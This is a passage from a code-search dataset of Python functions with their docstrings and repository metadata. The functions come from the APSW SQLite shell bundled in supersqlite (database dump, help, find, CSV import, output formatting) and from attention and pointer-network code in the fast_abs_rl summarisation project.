\"foreigns\": False}\n    def check(name, sql):\n        if name.lower().startswith(\"sqlite_\"):\n            return False\n        sql=sql.lower()\n        if re.match(r\"^\\s*create\\s+virtual\\s+.*\", sql):\n            v[\"virtuals\"]=True\n        # pragma table_info doesn't tell us if foreign keys\n        # are involved so we guess if any the various strings are\n        # in the sql somewhere\n        if re.match(r\".*\\b(foreign\\s*key|references)\\b.*\", sql):\n            v[\"foreigns\"]=True\n        return True\n\n    if len(cmd)==0:\n        cmd=[\"%\"]\n\n    tables=[]\n    for pattern in cmd:\n        for name,sql in self.db.cursor().execute(\"SELECT name,sql FROM sqlite_master \"\n                                                 \"WHERE sql NOT NULL AND type IN ('table','view') \"\n                                                 \"AND tbl_name LIKE ?1\", (pattern,)):\n            if check(name, sql) and name not in tables:\n                tables.append(name)\n\n    if not tables:\n        return\n\n    # will we need to analyze anything later?\n    analyze_needed=[]\n    for stat in self.db.cursor().execute(\"select name from sqlite_master where sql not null and type='table' and tbl_name like 'sqlite_stat%'\"):\n        for name in tables:\n            if len(self.db.cursor().execute(\"select * from \"+self._fmt_sql_identifier(stat[0])+\" WHERE tbl=?\", (name,)).fetchall()):\n                if name not in analyze_needed:\n                    analyze_needed.append(name)\n    analyze_needed.sort()\n\n    def blank():\n        self.write(self.stdout, \"\\n\")\n\n    def comment(s):\n        s=unicodify(s)\n        self.write(self.stdout, textwrap.fill(s, 78, initial_indent=\"-- \", subsequent_indent=\"-- \")+\"\\n\")\n\n    pats=\", \".join([(x,\"(All)\")[x==\"%\"] for x in cmd])\n    comment(\"SQLite dump (by APSW %s)\" % (apsw.apswversion(),))\n    comment(\"SQLite version \" + apsw.sqlitelibversion())\n    comment(\"Date: \" +unicodify(time.strftime(\"%c\")))\n    comment(\"Tables like: \"+pats)\n    comment(\"Database: \"+self.db.filename)\n    try:\n        import getpass\n        import socket\n        comment(\"User: %s @ %s\" % (unicodify(getpass.getuser()), unicodify(socket.gethostname())))\n    except ImportError:\n        pass\n    blank()\n\n    comment(\"The values of various per-database settings\")\n    self.write(self.stdout, \"PRAGMA page_size=\"+str(self.db.cursor().execute(\"pragma page_size\").fetchall()[0][0])+\";\\n\")\n    comment(\"PRAGMA encoding='\"+self.db.cursor().execute(\"pragma encoding\").fetchall()[0][0]+\"';\\n\")\n    vac={0: \"NONE\", 1: \"FULL\", 2: \"INCREMENTAL\"}\n    vacvalue=self.db.cursor().execute(\"pragma auto_vacuum\").fetchall()[0][0]\n    comment(\"PRAGMA auto_vacuum=\"+vac.get(vacvalue, str(vacvalue))+\";\\n\")\n    comment(\"PRAGMA max_page_count=\"+str(self.db.cursor().execute(\"pragma max_page_count\").fetchall()[0][0])+\";\\n\")\n    blank()\n\n    # different python versions have different requirements\n    # about specifying cmp to sort routine so we use this\n    # portable workaround with a decorated list instead\n    dectables=[(x.lower(), x) for x in tables]\n    dectables.sort()\n    tables=[y for x,y in dectables]\n\n    virtuals=v[\"virtuals\"]\n    foreigns=v[\"foreigns\"]\n\n    if virtuals:\n        comment(\"This pragma is needed to restore virtual tables\")\n        self.write(self.stdout, \"PRAGMA writable_schema=ON;\\n\")\n    if foreigns:\n        comment(\"This pragma turns off checking of foreign keys \"\n                \"as tables would be inconsistent while restoring.  It was introduced \"\n                \"in SQLite 3.6.19.\")\n        self.write(self.stdout, \"PRAGMA foreign_keys=OFF;\\n\")\n\n    if virtuals or foreigns:\n        blank()\n\n    self.write(self.stdout, \"BEGIN TRANSACTION;\\n\")\n    blank()\n\n    def sqldef(s):\n        # return formatted sql watching out for embedded\n        # comments at the end forcing trailing ; onto next\n        # line https://sqlite.org/src/info/c04a8b8a4f\n        if \"--\" in s.split(\"\\n\")[-1]:\n            nl=\"\\n\"\n        else:\n            nl=\"\"\n        return s+nl+\";\\n\"\n\n    # do the table dumping loops\n    oldtable=self._output_table\n    try:\n        self.push_output()\n        self.output=self.output_insert\n        # Dump the table\n        for table in tables:\n            for sql in self.db.cursor().execute(\"SELECT sql FROM sqlite_master WHERE name=?1 AND type='table'\", (table,)):\n                comment(\"Table  \"+table)\n                # Special treatment for virtual tables - they\n                # get called back on drops and creates and\n                # could thwart us so we have to manipulate\n                # sqlite_master directly\n                if sql[0].lower().split()[:3]==[\"create\", \"virtual\", \"table\"]:\n                    self.write(self.stdout, \"DELETE FROM sqlite_master WHERE name=\"+apsw.format_sql_value(table)+\" AND type='table';\\n\")\n                    self.write(self.stdout, \"INSERT INTO sqlite_master(type,name,tbl_name,rootpage,sql) VALUES('table',%s,%s,0,%s);\\n\"\n                               % (apsw.format_sql_value(table), apsw.format_sql_value(table), apsw.format_sql_value(sql[0])))\n                else:\n                    self.write(self.stdout, \"DROP TABLE IF EXISTS \"+self._fmt_sql_identifier(table)+\";\\n\")\n                    self.write(self.stdout, sqldef(sql[0]))\n                    self._output_table=self._fmt_sql_identifier(table)\n                    self.process_sql(\"select * from \"+self._fmt_sql_identifier(table), internal=True)\n                # Now any indices or triggers\n                first=True\n                for name,sql in self.db.cursor().execute(\"SELECT name,sql FROM sqlite_master \"\n                                                         \"WHERE sql NOT NULL AND type IN ('index', 'trigger') \"\n                                                         \"AND tbl_name=?1 AND name NOT LIKE 'sqlite_%' \"\n                                                         \"ORDER BY lower(name)\", (table,)):\n                    if first:\n                        comment(\"Triggers and indices on  \"+table)\n                        first=False\n                    self.write(self.stdout, sqldef(sql))\n                blank()\n        # Views done last.  They have to be done in the same order as they are in sqlite_master\n        # as they could refer to each other\n        first=True\n        for name,sql in self.db.cursor().execute(\"SELECT name,sql FROM sqlite_master \"\n                                                 \"WHERE sql NOT NULL AND type='view' \"\n                                                 \"AND name IN ( \"+\",\".join([apsw.format_sql_value(i) for i in tables])+\n                                                 \") ORDER BY _ROWID_\"):\n            if first:\n                comment(\"Views\")\n                first=False\n            self.write(self.stdout, \"DROP VIEW IF EXISTS %s;\\n\" % (self._fmt_sql_identifier(name),))\n            self.write(self.stdout, sqldef(sql))\n        if not first:\n            blank()\n\n        # sqlite sequence\n        # does it exist\n        if len(self.db.cursor().execute(\"select * from sqlite_master where name='sqlite_sequence'\").fetchall()):\n            first=True\n            for t in tables:\n                v=self.db.cursor().execute(\"select seq from main.sqlite_sequence where name=?1\", (t,)).fetchall()\n                if len(v):\n                    assert len(v)==1\n                    if first:\n                        comment(\"For primary key autoincrements the next id \"\n                                \"to use is stored in sqlite_sequence\")\n                        first=False\n                    self.write(self.stdout, 'DELETE FROM main.sqlite_sequence WHERE name=%s;\\n' % (apsw.format_sql_value(t),))\n                    self.write(self.stdout, 'INSERT INTO main.sqlite_sequence VALUES (%s, %s);\\n' % (apsw.format_sql_value(t), v[0][0]))\n            if not first:\n                blank()\n    finally:\n        self.pop_output()\n        self._output_table=oldtable\n\n    # analyze\n    if analyze_needed:\n        comment(\"You had used the analyze command on these tables before.  Rerun for this new data.\")\n        for n in analyze_needed:\n            self.write(self.stdout, \"ANALYZE \"+self._fmt_sql_identifier(n)+\";\\n\")\n        blank()\n\n    # user version pragma\n    uv=self.db.cursor().execute(\"pragma user_version\").fetchall()[0][0]\n    if uv:\n        comment(\"Your database may need this.  It is sometimes used to keep track of the schema version (eg Firefox does this).\")\n        self.write(self.stdout, \"pragma user_version=%d;\" % (uv,))\n        blank()\n\n    # Save it all\n    self.write(self.stdout, \"COMMIT TRANSACTION;\\n\")\n\n    # cleanup pragmas\n    if foreigns:\n        blank()\n        comment(\"Restoring foreign key checking back on.  Note that SQLite 3.6.19 is off by default\")\n        self.write(self.stdout, \"PRAGMA foreign_keys=ON;\\n\")\n    if virtuals:\n        blank()\n        comment(\"Restoring writable schema back to default\")\n        self.write(self.stdout, \"PRAGMA writable_schema=OFF;\\n\")\n        # schema reread\n        blank()\n        comment(\"We need to force SQLite to reread the schema because otherwise it doesn't know that \"\n                \"the virtual tables we inserted directly into sqlite_master exist.  See \"\n                \"last comments of https://sqlite.org/cvstrac/tktview?tn=3425\")\n        self.write(self.stdout, \"BEGIN;\\nCREATE TABLE no_such_table(x,y,z);\\nROLLBACK;\\n\")\n\nfinally:\n    self.process_sql(\"END\", internal=True)", "path": "supersqlite\\third_party\\_apsw\\tools\\shell.py", "repo_name": "plasticityai/supersqlite", "stars": 711, "license": "mit", "language": "python", "size": 25912}
{"docstring": "\"\"\"help ?COMMAND?: Shows list of commands and their usage.  If COMMAND is specified then shows detail about that COMMAND.  ('.help all' will show detailed help about all commands.)\n\"\"\"\n", "func_signal": "def command_help(self, cmd):\n", "code": "if not self._help_info:\n    # buildup help database\n    self._help_info={}\n    for c in dir(self):\n        if not c.startswith(\"command_\"):\n            continue\n        # help is 3 parts\n        # - the syntax string (eg backup ?dbname? filename)\n        # - the one liner description (eg saves database to filename)\n        # - the multi-liner detailed description\n        # We grab this from the doc string for the function in the form\n        #   syntax: one liner\\nmulti\\nliner\n        d=getattr(self, c).__doc__\n        assert d, c+\" command must have documentation\"\n        c=c[len(\"command_\"):]\n        if c in (\"headers\", \"color\"): continue\n        while d[0]==\"\\n\":\n            d=d[1:]\n        parts=d.split(\"\\n\", 1)\n        firstline=parts[0].strip().split(\":\", 1)\n        assert len(firstline)==2, c+\" command must have usage: description doc\"\n        if len(parts)==1 or len(parts[1].strip())==0: # work around textwrap bug\n            multi=\"\"\n        else:\n            multi=textwrap.dedent(parts[1])\n        if c==\"mode\":\n            if not self._output_modes:\n                self._cache_output_modes()\n            firstline[1]=firstline[1]+\" \"+\" \".join(self._output_modes)\n            multi=multi+\"\\n\\n\"+\"\\n\\n\".join(self._output_modes_detail)\n        if c==\"colour\":\n            colours=list(self._colours.keys())\n            colours.sort()\n            firstline[1]=firstline[1]+\" from \"+\", \".join(colours)\n        if len(multi.strip())==0: # All whitespace\n            multi=None\n        else:\n            multi=multi.strip(\"\\n\")\n            # we need to keep \\n\\n as a newline but turn all others into spaces\n            multi=multi.replace(\"\\n\\n\", \"\\x00\")\n            multi=multi.replace(\"\\n\", \" \")\n            multi=multi.replace(\"\\x00\", \"\\n\\n\")\n            multi=multi.split(\"\\n\\n\")\n        self._help_info[c]=('.'+firstline[0].strip(), firstline[1].strip(), multi)\n\nself.write(self.stderr, \"\\n\")\n\ntw=self._terminal_width()\nif tw<32:\n    tw=32\nif len(cmd)==0:\n    commands=list(self._help_info.keys())\n    commands.sort()\n    w=0\n    for command in commands:\n        if len(self._help_info[command][0])>w:\n            w=len(self._help_info[command][0])\n    out=[]\n    for command in commands:\n        hi=self._help_info[command]\n        # usage string\n        out.append(hi[0])\n        # space padding (including 2 for between columns)\n        out.append(\" \"*(2+w-len(hi[0])))\n        # usage message wrapped if need be\n        out.append((\"\\n\"+\" \"*(2+w)).join(textwrap.wrap(hi[1], tw-w-2)))\n        # newline\n        out.append(\"\\n\")\n    self.write(self.stderr, \"\".join(out))\nelse:\n    if cmd[0]==\"all\":\n        cmd=list(self._help_info.keys())\n        cmd.sort()\n    w=0\n    for command in self._help_info:\n        if len(self._help_info[command][0])>w:\n            w=len(self._help_info[command][0])\n\n    for command in cmd:\n        if command==\"headers\": command=\"header\"\n        if command not in self._help_info:\n            raise self.Error(\"No such command \\\"%s\\\"\" % (command,))\n        out=[]\n        hi=self._help_info[command]\n        # usage string\n        out.append(hi[0])\n        # space padding (2)\n        out.append(\" \"*(2+w-len(hi[0])))\n        # usage message wrapped if need be\n        out.append((\"\\n\"+\" \"*(2+w)).join(textwrap.wrap(hi[1], tw-w-2))+\"\\n\")\n        if hi[2]:\n            # newlines\n            out.append(\"\\n\")\n            # detailed message\n            for i,para in enumerate(hi[2]):\n                out.append(textwrap.fill(para, tw)+\"\\n\")\n                if i<len(hi[2])-1:\n                    out.append(\"\\n\")\n        # if not first one then print separator header\n        if command!=cmd[0]:\n            self.write(self.stderr, \"\\n\"+\"=\"*tw+\"\\n\")\n        self.write(self.stderr, \"\".join(out))\nself.write(self.stderr, \"\\n\")", "path": "supersqlite\\third_party\\_apsw\\tools\\shell.py", "repo_name": "plasticityai/supersqlite", "stars": 711, "license": "mit", "language": "python", "size": 25912}
{"docstring": "# Parse string and check against requested version.\n#\n# We use a regexp instead of str.split because we want to discard any\n# random junk that might come after the minor version -- this might happen\n# in patched/forked versions of glibc (e.g. Linaro's version of glibc\n# uses version strings like \"2.20-2014.11\"). See gh-3588.\n", "func_signal": "def check_glibc_version(version_str, required_major, minimum_minor):\n", "code": "m = re.match(r\"(?P<major>[0-9]+)\\.(?P<minor>[0-9]+)\", version_str)\nif not m:\n    warnings.warn(\"Expected glibc version with 2 components major.minor,\"\n                  \" got: %s\" % version_str, RuntimeWarning)\n    return False\nreturn (int(m.group(\"major\")) == required_major and\n        int(m.group(\"minor\")) >= minimum_minor)", "path": "glibc.py", "repo_name": "plasticityai/supersqlite", "stars": 711, "license": "mit", "language": "python", "size": 25912}
{"docstring": "\"\"\"find what ?TABLE?: Searches all columns of all tables for a value\n\nThe find command helps you locate data across your database\nfor example to find a string or any references to an id.\n\nYou can specify a like pattern to limit the search to a subset\nof tables (eg specifying 'CUSTOMER%' for all tables beginning\nwith CUSTOMER).\n\nThe what value will be treated as a string and/or integer if\npossible.  If what contains % or _ then it is also treated as\na like pattern.\n\nThis command will take a long time to execute needing to read\nall of the relevant tables.\n\"\"\"\n", "func_signal": "def command_find(self, cmd):\n", "code": "if len(cmd)<1 or len(cmd)>2:\n    raise self.Error(\"At least one argument required and at most two accepted\")\ntablefilter=\"%\"\nif len(cmd)==2:\n    tablefilter=cmd[1]\nquerytemplate=[]\nqueryparams=[]\ndef qp(): # binding for current queryparams\n    return \"?\"+str(len(queryparams))\ns=cmd[0]\nif '%' in s or '_' in s:\n    queryparams.append(s)\n    querytemplate.append(\"%s LIKE \"+qp())\nqueryparams.append(s)\nquerytemplate.append(\"%s = \"+qp())\ntry:\n    i=int(s)\n    queryparams.append(i)\n    querytemplate.append(\"%s = \"+qp())\nexcept ValueError:\n    pass\nquerytemplate=\" OR \".join(querytemplate)\nfor (table,) in self.db.cursor().execute(\"SELECT name FROM sqlite_master WHERE type='table' AND name LIKE ?1\", (tablefilter,)):\n    t=self._fmt_sql_identifier(table)\n    query=\"SELECT * from %s WHERE \" % (t,)\n    colq=[]\n    for _,column,_,_,_,_ in self.db.cursor().execute(\"pragma table_info(%s)\" % (t,)):\n        colq.append(querytemplate % ((self._fmt_sql_identifier(column),)*len(queryparams)))\n    query=query+\" OR \".join(colq)\n    self.process_sql(query, queryparams, internal=True, summary=(\"Table \"+table+\"\\n\", \"\\n\"))", "path": "supersqlite\\third_party\\_apsw\\tools\\shell.py", "repo_name": "plasticityai/supersqlite", "stars": 711, "license": "mit", "language": "python", "size": 25912}
{"docstring": "# Returns a csv reader that works around python bugs and uses\n# dialect dict to configure reader\n\n# Very easy for python 3\n", "func_signal": "def _csvin_wrapper(self, filename, dialect):\n", "code": "if sys.version_info>=(3,0):\n    thefile=codecs.open(filename, \"r\", self.encoding[0])\n    for line in csv.reader(thefile, **dialect.copy()):\n        yield line\n    thefile.close()\n    return\n\n###\n### csv module is not good at unicode so we have to\n### indirect unless utf8 is in use\n###\nif self.encoding[0].lower()==\"utf8\": # no need for tempfile\n    thefile=open(filename, \"rb\")\nelse:\n    import tempfile\n    thefile=tempfile.TemporaryFile(prefix=\"apsw_import\")\n    thefile.write(codecs.open(filename, \"r\", self.encoding[0]).read().encode(\"utf8\"))\n    # move back to beginning\n    thefile.seek(0,0)\n\n# Ensure all values are utf8 not unicode\nfor k,v in dialect.items():\n    if isinstance(v, unicode):\n        dialect[k]=v.encode(\"utf8\")\nfor line in csv.reader(thefile, **dialect):\n    # back to unicode again\n    yield [x.decode(\"utf8\") for x in line]\nthefile.close()", "path": "supersqlite\\third_party\\_apsw\\tools\\shell.py", "repo_name": "plasticityai/supersqlite", "stars": 711, "license": "mit", "language": "python", "size": 25912}
{"docstring": "\"\"\"open ?OPTIONS? ?FILE?: Closes existing database and opens a different one\n\nOptions are: --new which deletes the file if it already exists\n\nIf FILE is omitted then a memory database is opened\n\"\"\"\n", "func_signal": "def command_open(self, cmd):\n", "code": "new=False\ndbname=None\nc=cmd\nwhile c:\n    p=c.pop(0)\n    if p.startswith(\"--\"):\n        if p==\"--new\":\n            new=True\n            continue\n        raise self.Error(\"Unknown open param: \"+p)\n    if dbname:\n        raise self.Error(\"Too many arguments: \"+p)\n    dbname=p\n\nif new and dbname:\n    # close it first in case re-opening existing.  windows doesn't\n    # allow deleting open files, tag alongs cause problems etc\n    # hence retry and sleeps\n    self.db=(None, None)\n    for suffix in \"\", \"-journal\", \"-wal\", \"-shm\":\n        fn=dbname+suffix\n        for retry in range(1, 5):\n            try:\n                os.remove(fn)\n                break\n            except OSError:\n                if not os.path.isfile(fn):\n                    break\n                # under windows tag alongs can delay being able to\n                # delete after we have closed the file\n                import gc ; gc.collect(2)\n                time.sleep(.05*retry)\n        else:\n            os.rename(fn, fn+\"-DELETEME\")\n\nself.db=(None, dbname)", "path": "supersqlite\\third_party\\_apsw\\tools\\shell.py", "repo_name": "plasticityai/supersqlite", "stars": 711, "license": "mit", "language": "python", "size": 25912}
{"docstring": "\"\"\"Writes the difference between b4 and after to self.stderr.\nThe data is dictionaries returned from\n:meth:`get_resource_usage`.\"\"\"\n", "func_signal": "def display_timing(self, b4, after):\n", "code": "v=list(b4.keys())\nfor i in after:\n    if i not in v:\n        v.append(i)\nv.sort()\nfor k in v:\n    if k in b4 and k in after:\n        one=b4[k]\n        two=after[k]\n        val=two-one\n        if val:\n            if type(val)==float:\n                self.write(self.stderr, \"+ %s: %.4f\\n\" % (k, val))\n            else:\n                self.write(self.stderr, \"+ %s: %d\\n\" % (k, val))", "path": "supersqlite\\third_party\\_apsw\\tools\\shell.py", "repo_name": "plasticityai/supersqlite", "stars": 711, "license": "mit", "language": "python", "size": 25912}
{"docstring": "\"\"\"\nLines as SQL insert statements.  The table name is \"table\"\nunless you specified a different one as the second parameter\nto the .mode command.\n\"\"\"\n", "func_signal": "def output_insert(self, header, line):\n", "code": "if header:\n    return\nfmt=lambda x: self.colour.colour_value(x, apsw.format_sql_value(x))\nout=\"INSERT INTO \"+self._output_table+\" VALUES(\"+\",\".join([fmt(l) for l in line])+\");\\n\"\nself.write(self.stdout, out)", "path": "supersqlite\\third_party\\_apsw\\tools\\shell.py", "repo_name": "plasticityai/supersqlite", "stars": 711, "license": "mit", "language": "python", "size": 25912}
{"docstring": "\"\"\"\nEach line as a JSON object with a trailing comma.  Blobs are\noutput as base64 encoded strings.  You should be using UTF8\noutput encoding.\n\"\"\"\n", "func_signal": "def output_json(self, header, line):\n", "code": "if header:\n    self._output_json_cols=line\n    return\nfmt=lambda x: self.colour.colour_value(x, self._fmt_json_value(x))\nout=[\"%s: %s\" % (self._fmt_json_value(k), fmt(line[i])) for i,k in enumerate(self._output_json_cols)]\nself.write(self.stdout, \"{ \"+\", \".join(out)+\"},\\n\")", "path": "supersqlite\\third_party\\_apsw\\tools\\shell.py", "repo_name": "plasticityai/supersqlite", "stars": 711, "license": "mit", "language": "python", "size": 25912}
{"docstring": "\"\"\"Saves *enc* as the default encoding, after verifying that\nit is valid.  You can also include :error to specify error\nhandling - eg 'cp437:replace'\n\nRaises an exception on invalid encoding or error\n\"\"\"\n", "func_signal": "def set_encoding(self, enc):\n", "code": "enc=enc.split(\":\", 1)\nif len(enc)>1:\n    enc, errors=enc\nelse:\n    enc=enc[0]\n    errors=None\ntry:\n    codecs.lookup(enc)\nexcept LookupError:\n    raise self.Error(\"No known encoding '%s'\" % (enc,))\ntry:\n    if errors is not None:\n        codecs.lookup_error(errors)\nexcept LookupError:\n    raise self.Error(\"No known codec error handler '%s'\" % (errors,))\nself.encoding=enc, errors", "path": "supersqlite\\third_party\\_apsw\\tools\\shell.py", "repo_name": "plasticityai/supersqlite", "stars": 711, "license": "mit", "language": "python", "size": 25912}
{"docstring": "\"\"\"prompt MAIN ?CONTINUE?: Changes the prompts for first line and continuation lines\n\nThe default is to print 'sqlite> ' for the main prompt where\nyou can enter a dot command or a SQL statement.  If the SQL\nstatement is complete (eg not ; terminated) then you are\nprompted for more using the continuation prompt which defaults\nto ' ..> '.  Example:\n\n  .prompt \"Yes, Master> \" \"More, Master> \"\n\nYou can use backslash escapes such as \\\\n and \\\\t.\n\"\"\"\n", "func_signal": "def command_prompt(self, cmd):\n", "code": "if len(cmd)<1 or len(cmd)>2:\n    raise self.Error(\"prompt takes one or two arguments\")\nself.prompt=self.fixup_backslashes(cmd[0])\nif len(cmd)==2:\n    self.moreprompt=self.fixup_backslashes(cmd[1])", "path": "supersqlite\\third_party\\_apsw\\tools\\shell.py", "repo_name": "plasticityai/supersqlite", "stars": 711, "license": "mit", "language": "python", "size": 25912}
{"docstring": "\"\"\"Return abbreviated implementation name.\"\"\"\n", "func_signal": "def get_abbr_impl():\n", "code": "if hasattr(sys, 'pypy_version_info'):\n    pyimpl = 'pp'\nelif sys.platform.startswith('java'):\n    pyimpl = 'jy'\nelif sys.platform == 'cli':\n    pyimpl = 'ip'\nelse:\n    pyimpl = 'cp'\nreturn pyimpl", "path": "pep425tags.py", "repo_name": "plasticityai/supersqlite", "stars": 711, "license": "mit", "language": "python", "size": 25912}
{"docstring": "\"\"\"Returns a single line of input (may be incomplete SQL) from self.stdin.\n\nIf EOF is reached then return None.  Do not include trailing\nnewline in return.\n\"\"\"\n", "func_signal": "def getline(self, prompt=\"\"):\n", "code": "self.stdout.flush()\nself.stderr.flush()\ntry:\n    if self.interactive:\n        if self.stdin is sys.stdin:\n            c=self.colour.prompt, self.colour.prompt_\n            if self._using_readline and sys.platform!=\"win32\":\n                # these are needed so that readline knows they are non-printing characters\n                c=\"\\x01\"+c[0]+\"\\x02\", \"\\x01\"+c[1]+\"\\x02\",\n            line=self._raw_input(c[0]+prompt+c[1])+\"\\n\" # raw_input excludes newline\n        else:\n            self.write(self.stdout, prompt)\n            line=self.stdin.readline()  # includes newline unless last line of file doesn't have one\n    else:\n        line=self.stdin.readline()  # includes newline unless last line of file doesn't have one\n    self.input_line_number+=1\n    if sys.version_info<(3,0):\n        if type(line)!=unicode:\n            enc=getattr(self.stdin, \"encoding\", self.encoding[0])\n            if not enc: enc=self.encoding[0]\n            line=line.decode(enc)\nexcept EOFError:\n    return None\nif len(line)==0: # always a \\n on the end normally so this is EOF\n    return None\nif line[-1]==\"\\n\":\n    line=line[:-1]\nreturn line", "path": "supersqlite\\third_party\\_apsw\\tools\\shell.py", "repo_name": "plasticityai/supersqlite", "stars": 711, "license": "mit", "language": "python", "size": 25912}
{"docstring": "\"\"\" query[(Bs), B, D], key[B, T, D], value[B, T, D]\"\"\"\n", "func_signal": "def step_attention(query, key, value, mem_mask=None):\n", "code": "score = dot_attention_score(key, query.unsqueeze(-2))\nif mem_mask is None:\n    norm_score = F.softmax(score, dim=-1)\nelse:\n    norm_score = prob_normalize(score, mem_mask)\noutput = attention_aggregate(value, norm_score)\nreturn output.squeeze(-2), norm_score.squeeze(-2)", "path": "model\\attention.py", "repo_name": "ChenRocks/fast_abs_rl", "stars": 618, "license": "mit", "language": "python", "size": 82}
{"docstring": "\"\"\" users are resposible for shaping\nReturn: tensor_type [B, T]\n\"\"\"\n", "func_signal": "def len_mask(lens, device):\n", "code": "max_len = max(lens)\nbatch_size = len(lens)\nmask = torch.ByteTensor(batch_size, max_len).to(device)\nmask.fill_(0)\nfor i, l in enumerate(lens):\n    mask[i, :l].fill_(1)\nreturn mask", "path": "model\\util.py", "repo_name": "ChenRocks/fast_abs_rl", "stars": 618, "license": "mit", "language": "python", "size": 82}
{"docstring": "\"\"\"extract k sentences, decode only, batch_size==1\"\"\"\n", "func_signal": "def extract(self, attn_mem, mem_sizes, k):\n", "code": "attn_feat, hop_feat, lstm_states, lstm_in = self._prepare(attn_mem)\nlstm_in = lstm_in.squeeze(1)\nif self._lstm_cell is None:\n    self._lstm_cell = MultiLayerLSTMCells.convert(\n        self._lstm).to(attn_mem.device)\nextracts = []\nfor _ in range(k):\n    h, c = self._lstm_cell(lstm_in, lstm_states)\n    query = h[-1]\n    for _ in range(self._n_hop):\n        query = LSTMPointerNet.attention(\n            hop_feat, query, self._hop_v, self._hop_wq, mem_sizes)\n    score = LSTMPointerNet.attention_score(\n        attn_feat, query, self._attn_v, self._attn_wq)\n    score = score.squeeze()\n    for e in extracts:\n        score[e] = -1e6\n    ext = score.max(dim=0)[1].item()\n    extracts.append(ext)\n    lstm_states = (h, c)\n    lstm_in = attn_mem[:, ext, :]\nreturn extracts", "path": "model\\extract.py", "repo_name": "ChenRocks/fast_abs_rl", "stars": 618, "license": "mit", "language": "python", "size": 82}
{"docstring": "\"\"\" extract top-k scored sentences from article (eval only)\"\"\"\n", "func_signal": "def extract(self, article_sents, sent_nums=None, k=4):\n", "code": "enc_sent, enc_art = self._encode(article_sents, sent_nums)\nsaliency = torch.matmul(enc_sent, enc_art.unsqueeze(2))\ncontent = self._sent_linear(enc_sent)\nlogit = (content + saliency).squeeze(2)\nif sent_nums is None:  # test-time extract only\n    assert len(article_sents) == 1\n    n_sent = logit.size(1)\n    extracted = logit[0].topk(\n        k if k < n_sent else n_sent, sorted=False  # original order\n    )[1].tolist()\nelse:\n    extracted = [l[:n].topk(k if k < n else n)[1].tolist()\n                 for n, l in zip(sent_nums, logit)]\nreturn extracted", "path": "model\\extract.py", "repo_name": "ChenRocks/fast_abs_rl", "stars": 618, "license": "mit", "language": "python", "size": 82}
{"docstring": "\"\"\"\nlstm_states: (H, C) of tensor [layer, batch, hidden]\norder: list of sequence length\n\"\"\"\n", "func_signal": "def reorder_lstm_states(lstm_states, order):\n", "code": "assert isinstance(lstm_states, tuple)\nassert len(lstm_states) == 2\nassert lstm_states[0].size() == lstm_states[1].size()\nassert len(order) == lstm_states[0].size()[1]\n\norder = torch.LongTensor(order).to(lstm_states[0].device)\nsorted_states = (lstm_states[0].index_select(index=order, dim=1),\n                 lstm_states[1].index_select(index=order, dim=1))\n\nreturn sorted_states", "path": "model\\util.py", "repo_name": "ChenRocks/fast_abs_rl", "stars": 618, "license": "mit", "language": "python", "size": 82}
{"docstring": "\"\"\" [(...), T]\nuser should handle mask shape\"\"\"\n", "func_signal": "def prob_normalize(score, mask):\n", "code": "score = score.masked_fill(mask == 0, -1e18)\nnorm_score = F.softmax(score, dim=-1)\nreturn norm_score", "path": "model\\attention.py", "repo_name": "ChenRocks/fast_abs_rl", "stars": 618, "license": "mit", "language": "python", "size": 82}
{"docstring": "\"\"\"embedding is the weight matrix\"\"\"\n", "func_signal": "def set_embedding(self, embedding):\n", "code": "assert self._embedding.weight.size() == embedding.size()\nself._embedding.weight.data.copy_(embedding)", "path": "model\\extract.py", "repo_name": "ChenRocks/fast_abs_rl", "stars": 618, "license": "mit", "language": "python", "size": 82}
{"docstring": "\"\"\"atten_mem: Tensor of size [batch_size, max_sent_num, input_dim]\"\"\"\n", "func_signal": "def forward(self, attn_mem, mem_sizes, lstm_in):\n", "code": "attn_feat, hop_feat, lstm_states, init_i = self._prepare(attn_mem)\nlstm_in = torch.cat([init_i, lstm_in], dim=1).transpose(0, 1)\nquery, final_states = self._lstm(lstm_in, lstm_states)\nquery = query.transpose(0, 1)\nfor _ in range(self._n_hop):\n    query = LSTMPointerNet.attention(\n        hop_feat, query, self._hop_v, self._hop_wq, mem_sizes)\noutput = LSTMPointerNet.attention_score(\n    attn_feat, query, self._attn_v, self._attn_wq)\nreturn output  # unormalized extraction logit", "path": "model\\extract.py", "repo_name": "ChenRocks/fast_abs_rl", "stars": 618, "license": "mit", "language": "python", "size": 82}
{"docstring": "\"\"\"\nsequence_emb: [T, B, D] if not batch_first\norder: list of sequence length\n\"\"\"\n", "func_signal": "def reorder_sequence(sequence_emb, order, batch_first=False):\n", "code": "batch_dim = 0 if batch_first else 1\nassert len(order) == sequence_emb.size()[batch_dim]\n\norder = torch.LongTensor(order).to(sequence_emb.device)\nsorted_ = sequence_emb.index_select(index=order, dim=batch_dim)\n\nreturn sorted_", "path": "model\\util.py", "repo_name": "ChenRocks/fast_abs_rl", "stars": 618, "license": "mit", "language": "python", "size": 82}
{"docstring": "\"\"\" attention context vector\"\"\"\n", "func_signal": "def attention(attention, query, v, w):\n", "code": "score = F.softmax(\n    PtrExtractorRL.attention_score(attention, query, v, w), dim=-1)\noutput = torch.mm(score, attention)\nreturn output", "path": "model\\rl.py", "repo_name": "ChenRocks/fast_abs_rl", "stars": 618, "license": "mit", "language": "python", "size": 82}
{"docstring": "\"\"\"[B, Tv, D], [(Bs), B, Tq, Tv] -> [(Bs), B, Tq, D]\"\"\"\n", "func_signal": "def attention_aggregate(value, score):\n", "code": "output = score.matmul(value)\nreturn output", "path": "model\\attention.py", "repo_name": "ChenRocks/fast_abs_rl", "stars": 618, "license": "mit", "language": "python", "size": 82}
